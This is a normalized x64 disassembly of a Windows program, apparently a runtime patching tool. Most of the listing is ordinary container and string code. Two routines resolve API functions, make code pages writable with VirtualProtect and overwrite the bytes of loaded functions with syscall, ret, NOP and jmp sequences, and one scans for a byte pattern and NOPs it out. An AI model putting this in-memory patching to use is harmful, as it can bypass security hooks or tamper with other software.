lea rcx [ rsp ]
nop [ rax + rax ] ax
mov rcx [ r9 + 0x10 ]
lea rdx [ rdx + rcx * 2 ]
cmp rax rdx
je r-xdata
mov [ rax ] r10w
add rax 0x2
jmp r-xdata
inc edx
add rcx 0x2
cmp edx 0x9
jb r-xdata
cmp [ r9 + 0x18 ] 0x8
jb r-xdata
cmp r8w [ rcx ]
je r-xdata
add rax 0x2
jmp r-xdata
sub_140018d50
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_140018e10
sub rdi rax
mov rax 0x2e8ba2e8ba2e8ba3
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x58
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rdx rdi
call sub_1400155f0
nop
imul rdi rdi 0x58
add rdi [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_140018e10
jmp r-xdata
mov rdx rdi
call sub_1400155f0
nop
sub_140018e10
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x2e8ba2e8ba2e8ba3
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x2e8ba2e8ba2e8b9
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x2e8ba2e8ba2e8ba
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_140018ed0
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_140018ed0
sub_140018ed0
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov rbx rdx
mov rdi rcx
mov rax 0x2e8ba2e8ba2e8ba
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rdi ]
mov r12 0x2e8ba2e8ba2e8ba3
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rbx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
mov rcx rbx
call sub_1400153a0
mov rsi rax
mov [ rsp + 0x48 ] rax
mov r8 rax
mov rdx [ rdi + 0x8 ]
mov rcx [ rdi ]
call sub_140018fd0
nop
mov r9 [ rdi + 0x8 ]
mov rcx [ rdi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x4
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
imul rbx rbx 0x58
add rbx rsi
mov [ rdi + 0x10 ] rbx
imul r12 r12 0x58
add r12 rsi
mov [ rdi + 0x8 ] r12
mov [ rdi ] rsi
mov rdx r9
call sub_1400150b0
mov rcx [ rdi ]
call j_sub_14003ad04
sub_140018fd0
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x58
mov [ rsp + 0x60 ] rbx
add rdi 0x58
jmp r-xdata
mov rax [ rdi ]
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
lea rdx [ rdi + 0x8 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rcx [ rbx + 0x30 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
lea rdx [ rdi + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
cmp rdi rsi
je r-xdata
sub_140019080
mov rax rsp
push rbp
lea rbp [ rax - 0x138 ]
sub rsp 0x230
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x120 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_140019fe0 ]
mov [ rbp ] rax
mov [ rbp + 0x20 ] 0x7
mov [ rbp + 0x18 ] rdi
mov [ rbp + 0x8 ] di
xor r8d r8d
lea edx [ rdi + 0xa ]
lea rcx [ rbp + 0x8 ]
call sub_1400025a0
lea r11 [ rbp + 0x8 ]
cmp [ rbp + 0x20 ] 0x8
cmovae r11 [ rbp + 0x8 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov eax [ r--data ]
mov [ r11 + 0x10 ] eax
mov [ rbp + 0x18 ] 0xa
lea rax [ rbp + 0x8 ]
cmp [ rbp + 0x20 ] 0x8
cmovae rax [ rbp + 0x8 ]
mov [ rax + 0x14 ] di
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x58 ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
mov r8d 0xb0
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp + 0x40 ] 0x58
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0xb0 ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14001a0d0 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
xor r8d r8d
lea edx [ rdi + 0x9 ]
lea rcx [ rbp - 0x58 ]
call sub_1400025a0
lea r11 [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x8
cmovae r11 [ rbp - 0x58 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
movzx eax [ r--data ]
mov [ r11 + 0x10 ] ax
mov [ rbp - 0x48 ] 0x9
lea rax [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x8
cmovae rax [ rbp - 0x58 ]
mov [ rax + 0x12 ] di
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x53 ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea rcx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rcx [ rbp - 0x30 ]
mov r8d 0xa6
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x20 ] 0x53
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0xa6 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140019c90 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
xor r8d r8d
lea edx [ rdi + 0xa ]
lea rcx [ rsp + 0x48 ]
call sub_1400025a0
lea r11 [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae r11 [ rsp + 0x48 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov eax [ r--data ]
mov [ r11 + 0x10 ] eax
mov [ rsp + 0x58 ] 0xa
lea rax [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae rax [ rsp + 0x48 ]
mov [ rax + 0x14 ] di
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x57 ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea rcx [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rcx [ rsp + 0x70 ]
mov r8d 0xae
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x80 ] 0x57
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0xae ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14001a5e0 ]
mov [ rbp + 0xc0 ] r11
mov [ rbp + 0xe0 ] 0x7
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
lea r8d [ rdi + 0x7 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xc8 ]
call sub_140001ea0
nop
mov [ rbp + 0x108 ] 0x7
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
lea r8d [ rdi + 0x1f ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0xc0 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_140019600 ]
mov [ rbp + 0x60 ] r11
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
lea r8d [ rdi + 0x9 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x68 ]
call sub_140001ea0
nop
mov [ rbp + 0xa8 ] 0x7
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
lea r8d [ rdi + 0xf ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x90 ]
call sub_140001ea0
nop
lea rdx [ rbp + 0x60 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov [ rbp + 0xa8 ] 0x7
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
mov [ rbp + 0x108 ] 0x7
mov [ rbp + 0x100 ] rdi
mov [ rbp + 0xf0 ] di
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf0 ]
call j_sub_14003ad04
mov [ rbp + 0xe0 ] 0x7
mov [ rbp + 0xd8 ] rdi
mov [ rbp + 0xc8 ] di
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x120 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x230 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_140019600
push rbp
push rsi
push rdi
push r12
push r13
mov rbp rsp
sub rsp 0x50
mov [ rbp - 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x80 ] rbx
xor esi esi
mov [ rbp - 0x28 ] rsi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x18 ] rsi
lea edx [ rsi + 0x1 ]
lea rcx [ rbp - 0x28 ]
call sub_14001ade0
mov r11 [ rbp - 0x20 ]
test r11 r11
je r-xdata
add r11 0x4
mov [ rbp - 0x20 ] r11
mov [ rbp + 0x38 ] 0x7
lea rax [ rbp + 0x38 ]
mov rdi [ rbp - 0x28 ]
cmp rax r11
jae r-xdata
mov [ r11 ] 0x5
mov r13 0x3ffffffffffffffe
mov r12 0x3fffffffffffffff
mov rdx [ rbp - 0x18 ]
cmp r11 rdx
jne r-xdata
lea rax [ rbp + 0x38 ]
cmp rdi rax
ja r-xdata
test r11 r11
je r-xdata
mov r8 r11
sub r8 rdi
sar r8 0x2
cmp r8 r13
jbe r-xdata
lea rbx [ rbp + 0x38 ]
sub rbx rdi
sar rbx 0x2
mov r13 0x3ffffffffffffffe
mov r12 0x3fffffffffffffff
mov rdx [ rbp - 0x18 ]
cmp r11 rdx
jne r-xdata
add r11 0x4
mov [ rbp - 0x20 ] r11
mov [ rbp + 0x38 ] 0x9
lea rax [ rbp + 0x38 ]
cmp rax r11
jae r-xdata
mov [ r11 ] 0x7
inc r8
mov rcx rdx
sub rcx rdi
sar rcx 0x2
cmp r8 rcx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test r11 r11
je r-xdata
mov r8 r11
sub r8 rdi
sar r8 0x2
cmp r8 r13
jbe r-xdata
cmp r11 rdx
jne r-xdata
lea rax [ rbp + 0x38 ]
cmp rdi rax
ja r-xdata
mov rdx rcx
shr rdx 0x1
mov rax r12
sub rax rdx
cmp rax rcx
jae r-xdata
mov eax [ rdi + rbx * 4 ]
mov [ r11 ] eax
jmp r-xdata
inc r8
mov rcx rdx
sub rcx rdi
sar rcx 0x2
cmp r8 rcx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test r11 r11
je r-xdata
mov r8 r11
sub r8 rdi
sar r8 0x2
cmp r8 r13
jbe r-xdata
lea rbx [ rbp + 0x38 ]
sub rbx rdi
sar rbx 0x2
cmp r11 rdx
jne r-xdata
add rcx rdx
mov rcx rsi
jmp r-xdata
mov rdx rcx
shr rdx 0x1
mov rax r12
sub rax rdx
cmp rax rcx
jae r-xdata
add r11 0x4
mov [ rbp - 0x20 ] r11
mov [ rbp + 0x38 ] 0xb
lea rax [ rbp + 0x38 ]
cmp rax r11
jae r-xdata
mov [ r11 ] 0x9
inc r8
mov rcx rdx
sub rcx rdi
sar rcx 0x2
cmp r8 rcx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test r11 r11
je r-xdata
mov r8 r11
sub r8 rdi
sar r8 0x2
cmp r8 r13
jbe r-xdata
cmp rcx r8
cmovb rcx r8
mov rdx rcx
lea rcx [ rbp - 0x28 ]
call sub_14001ade0
mov rdx [ rbp - 0x18 ]
mov r11 [ rbp - 0x20 ]
mov rdi [ rbp - 0x28 ]
add rcx rdx
mov rcx rsi
jmp r-xdata
cmp r11 rdx
jne r-xdata
lea rax [ rbp + 0x38 ]
cmp rdi rax
ja r-xdata
mov rdx rcx
shr rdx 0x1
mov rax r12
sub rax rdx
cmp rax rcx
jae r-xdata
mov eax [ rdi + rbx * 4 ]
mov [ r11 ] eax
jmp r-xdata
inc r8
mov rcx rdx
sub rcx rdi
sar rcx 0x2
cmp r8 rcx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp rcx r8
cmovb rcx r8
mov rdx rcx
lea rcx [ rbp - 0x28 ]
call sub_14001ade0
mov rdx [ rbp - 0x18 ]
mov r11 [ rbp - 0x20 ]
mov rdi [ rbp - 0x28 ]
test r11 r11
je r-xdata
mov r8 r11
sub r8 rdi
sar r8 0x2
cmp r8 r13
jbe r-xdata
lea rbx [ rbp + 0x38 ]
sub rbx rdi
sar rbx 0x2
cmp r11 rdx
jne r-xdata
add rcx rdx
mov rcx rsi
jmp r-xdata
mov rdx rcx
shr rdx 0x1
mov rax r12
sub rax rdx
cmp rax rcx
jae r-xdata
add r11 0x4
mov [ rbp - 0x20 ] r11
mov [ rbp + 0x38 ] 0xc
lea rax [ rbp + 0x38 ]
cmp rax r11
jae r-xdata
mov [ r11 ] 0xb
inc r8
mov rcx rdx
sub rcx rdi
sar rcx 0x2
cmp r8 rcx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test r11 r11
je r-xdata
mov r8 r11
sub r8 rdi
sar r8 0x2
cmp r8 r13
jbe r-xdata
cmp rcx r8
cmovb rcx r8
mov rdx rcx
lea rcx [ rbp - 0x28 ]
call sub_14001ade0
mov rdx [ rbp - 0x18 ]
mov r11 [ rbp - 0x20 ]
mov rdi [ rbp - 0x28 ]
add rcx rdx
mov rcx rsi
jmp r-xdata
cmp r11 rdx
jne r-xdata
lea rax [ rbp + 0x38 ]
cmp rdi rax
ja r-xdata
mov rdx rcx
shr rdx 0x1
mov rax r12
sub rax rdx
cmp rax rcx
jae r-xdata
mov eax [ rdi + rbx * 4 ]
mov [ r11 ] eax
jmp r-xdata
inc r8
mov rcx rdx
sub rcx rdi
sar rcx 0x2
cmp r8 rcx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp rcx r8
cmovb rcx r8
mov rdx rcx
lea rcx [ rbp - 0x28 ]
call sub_14001ade0
mov rdx [ rbp - 0x18 ]
mov r11 [ rbp - 0x20 ]
mov rdi [ rbp - 0x28 ]
test r11 r11
je r-xdata
mov rax r11
sub rax rdi
sar rax 0x2
cmp rax r13
jbe r-xdata
lea rbx [ rbp + 0x38 ]
sub rbx rdi
sar rbx 0x2
cmp r11 rdx
jne r-xdata
add rcx rdx
mov rcx rsi
jmp r-xdata
mov rdx rcx
shr rdx 0x1
mov rax r12
sub rax rdx
cmp rax rcx
jae r-xdata
add r11 0x4
mov [ rbp - 0x20 ] r11
lea rcx [ rbp - 0x28 ]
call sub_140008330
test al al
je r-xdata
mov [ r11 ] 0xc
inc rax
sub rdx rdi
sar rdx 0x2
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test r11 r11
je r-xdata
mov rax r11
sub rax rdi
sar rax 0x2
cmp rax r13
jbe r-xdata
cmp rcx r8
cmovb rcx r8
mov rdx rcx
lea rcx [ rbp - 0x28 ]
call sub_14001ade0
mov rdx [ rbp - 0x18 ]
mov r11 [ rbp - 0x20 ]
mov rdi [ rbp - 0x28 ]
add rcx rdx
mov rcx rsi
jmp r-xdata
test rdi rdi
je r-xdata
mov [ rbp + 0x40 ] 0x50f
mov [ rbp + 0x42 ] 0xc3
mov [ rbp + 0x38 ] 0x9090
mov [ rbp + 0x3a ] 0xe9
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov rbx rax
lea rdx [ rbp + 0x38 ]
movzx r8d [ rax + 0x8 ]
cmp r8w [ rdx ]
jne r-xdata
mov rcx rdx
shr rcx 0x1
sub r12 rcx
cmp r12 rdx
jae r-xdata
mov eax [ rdi + rbx * 4 ]
mov [ r11 ] eax
jmp r-xdata
inc rax
sub rdx rdi
sar rdx 0x2
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp rcx r8
cmovb rcx r8
mov rdx rcx
lea rcx [ rbp - 0x28 ]
call sub_14001ade0
mov rdx [ rbp - 0x18 ]
mov r11 [ rbp - 0x20 ]
mov rdi [ rbp - 0x28 ]
mov al 0x1
mov rbx [ rsp + 0x80 ]
add rsp 0x50
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rdi
call j_sub_14003ad04
sbb ecx ecx
sbb ecx 0xffffffff
movzx r8d [ rax + 0xa ]
cmp r8b [ rdx + 0x2 ]
jne r-xdata
add rdx rcx
mov rdx rsi
jmp r-xdata
mov rcx rdx
shr rcx 0x1
sub r12 rcx
cmp r12 rdx
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
lea rdx [ r--data ]
lea r12 [ rw-data ]
mov rcx r12
call sub_14000ac10
movsxd r11 [ rbx + 0xb ]
lea r13 [ r11 + rbx + 0xf ]
lea r9 [ rbp + 0x38 ]
mov edx 0x3
lea r8d [ rdx + 0x3d ]
mov rcx r13
call [ VirtualProtect@IAT ]
test eax eax
je r-xdata
mov ecx esi
jmp r-xdata
cmp rdx rax
cmovb rdx rax
lea rcx [ rbp - 0x28 ]
call sub_14001ade0
mov r11 [ rbp - 0x20 ]
mov rdi [ rbp - 0x28 ]
add rdx rcx
mov rdx rsi
jmp r-xdata
lea rdx [ r--data ]
mov r9d 0x3
lea r8 [ rbp + 0x40 ]
mov edx r9d
mov rcx r13
call sub_14003b740
test eax eax
sete bl
lea r9 [ rbp + 0x48 ]
mov r8d [ rbp + 0x38 ]
mov edx 0x3
mov rcx r13
call [ VirtualProtect@IAT ]
test bl bl
lea rdx [ r--data ]
jne r-xdata
test ecx ecx
jne r-xdata
cmp rdx rax
cmovb rdx rax
lea rcx [ rbp - 0x28 ]
call sub_14001ade0
mov r11 [ rbp - 0x20 ]
mov rdi [ rbp - 0x28 ]
movsxd rcx [ rax + 0x4 ]
add rcx r12
test esi esi
je r-xdata
mov rcx [ rcx + r12 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove esi ecx
mov rax [ rw-data ]
mov rcx r12
call sub_14000ac10
mov edx 0xa
mov rcx r12
call sub_1400085e0
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r12 + 0x10 ] 0x6
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx esi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
jmp r-xdata
or edx 0x4
sub_140019c90
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rbp - 0x29 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x47 ] rax
xor r12d r12d
mov [ rbp - 0x49 ] r12
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x39 ] r12
lea edx [ r12 + 0x1 ]
lea rcx [ rbp - 0x49 ]
call sub_14001ade0
mov r11 [ rbp - 0x41 ]
test r11 r11
je r-xdata
add r11 0x4
mov [ rbp - 0x41 ] r11
mov [ rbp + 0x2f ] 0x4
lea rax [ rbp + 0x2f ]
mov rsi [ rbp - 0x49 ]
cmp rax r11
jae r-xdata
mov [ r11 ] 0x2
mov rdx [ rbp - 0x39 ]
cmp r11 rdx
jne r-xdata
lea rax [ rbp + 0x2f ]
cmp rsi rax
ja r-xdata
test r11 r11
je r-xdata
mov rax r11
sub rax rsi
sar rax 0x2
mov rcx 0x3ffffffffffffffe
cmp rax rcx
jbe r-xdata
lea rbx [ rbp + 0x2f ]
sub rbx rsi
sar rbx 0x2
mov rdx [ rbp - 0x39 ]
cmp r11 rdx
jne r-xdata
add r11 0x4
mov [ rbp - 0x41 ] r11
lea rcx [ rbp - 0x49 ]
call sub_140008330
test al al
je r-xdata
mov [ r11 ] 0x4
inc rax
sub rdx rsi
sar rdx 0x2
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test r11 r11
je r-xdata
mov rax r11
sub rax rsi
sar rax 0x2
mov rcx 0x3ffffffffffffffe
cmp rax rcx
jbe r-xdata
test rsi rsi
je r-xdata
mov [ rbp + 0x2f ] 0x83ffffff
mov [ rbp + 0x33 ] 0x840f02ff
mov [ rbp + 0x37 ] 0x90909090
mov [ rbp + 0x3b ] 0x90909090
mov [ rbp + 0x3f ] 0x90
mov ecx 0x20
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
mov r8 rdx
shr r8 0x1
mov rcx 0x3fffffffffffffff
sub rcx r8
cmp rcx rdx
jae r-xdata
mov eax [ rsi + rbx * 4 ]
mov [ r11 ] eax
jmp r-xdata
inc rax
sub rdx rsi
sar rdx 0x2
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov al 0x1
mov rcx [ rbp + 0x47 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx rsi
call j_sub_14003ad04
mov rdi r12
mov [ rax ] r12
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] r12
jmp r-xdata
add rdx r8
mov rdx r12
jmp r-xdata
mov r8 rdx
shr r8 0x1
mov rcx 0x3fffffffffffffff
sub rcx r8
cmp rcx rdx
jae r-xdata
test rdi rdi
je r-xdata
mov rbx [ rdi ]
cmp rbx [ rdi + 0x8 ]
je r-xdata
mov [ rbp + 0x1f ] 0x7
mov [ rbp + 0x17 ] r12
mov [ rbp + 0x7 ] r12w
xor r8d r8d
lea edx [ r8 + 0xc ]
lea rcx [ rbp + 0x7 ]
call sub_1400025a0
lea r11 [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x8
cmovae r11 [ rbp + 0x7 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov [ rbp + 0x17 ] 0xc
lea rax [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x8
cmovae rax [ rbp + 0x7 ]
mov [ rax + 0x18 ] r12w
lea rdx [ rbp + 0x7 ]
mov rcx rdi
call sub_14000c0b0
test al al
je r-xdata
cmp rdx rax
cmovb rdx rax
lea rcx [ rbp - 0x49 ]
call sub_14001ade0
mov r11 [ rbp - 0x41 ]
mov rsi [ rbp - 0x49 ]
add rdx r8
mov rdx r12
jmp r-xdata
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
mov rcx rdi
call sub_14000d510
mov rcx rdi
call j_sub_14003ad04
nop
mov [ rbp - 0x9 ] 0x7
mov [ rbp - 0x11 ] r12
mov [ rbp - 0x21 ] r12w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rbp - 0x21 ]
call sub_140001ea0
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] 0x9
lea rax [ rbp + 0x37 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x8
lea r8 [ rbp + 0x2f ]
lea rdx [ rbp - 0x21 ]
mov ecx [ rbx + 0x8 ]
call sub_140007c60
add rbx 0x58
cmp rbx [ rdi + 0x8 ]
jne r-xdata
cmp rdx rax
cmovb rdx rax
lea rcx [ rbp - 0x49 ]
call sub_14001ade0
mov r11 [ rbp - 0x41 ]
mov rsi [ rbp - 0x49 ]
mov rcx [ rbp + 0x7 ]
call j_sub_14003ad04
nop
sub_140019fe0
push rbp
lea rbp [ rsp - 0x57 ]
sub rsp 0xc0
mov [ rbp - 0x1 ] 0xfffffffffffffffe
mov [ rsp + 0xd0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x47 ] rax
mov [ rbp + 0x3f ] 0x5314ec83
mov [ rbp + 0x43 ] 0xd98b
mov [ rbp + 0x37 ] 0x4c201b0
mov [ rbp + 0x3b ] 0x0
lea rax [ rbp - 0x29 ]
mov [ rbp + 0x7 ] rax
mov [ rbp - 0x11 ] 0x7
xor ebx ebx
mov [ rbp - 0x19 ] rbx
mov [ rbp - 0x29 ] bx
xor r8d r8d
lea rdx [ r--data ]
